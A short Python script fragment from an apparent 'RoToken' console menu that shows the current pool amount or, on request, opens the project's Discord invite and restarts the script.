discords = ['discord', 'Discord', 'DISCORD', 'Discord ']
pools = ['pool', 'pools', 'POOL', 'POOLS', 'Pools', 'Pool']
if userid in pools:
    print(f'The current RoToken pool is up to ${pool}')
    next = input('Enter to continue, end to quit... ')
    if next == '':
        os.execv(sys.executable, ['python'] + sys.argv)
    else:
        pass
else:
    pass
if userid in discords:
    webbrowser.open('https://discord.gg/GBAuk5GxgE')
    done = input('Launched the RoToken discord invite, enter to restart')
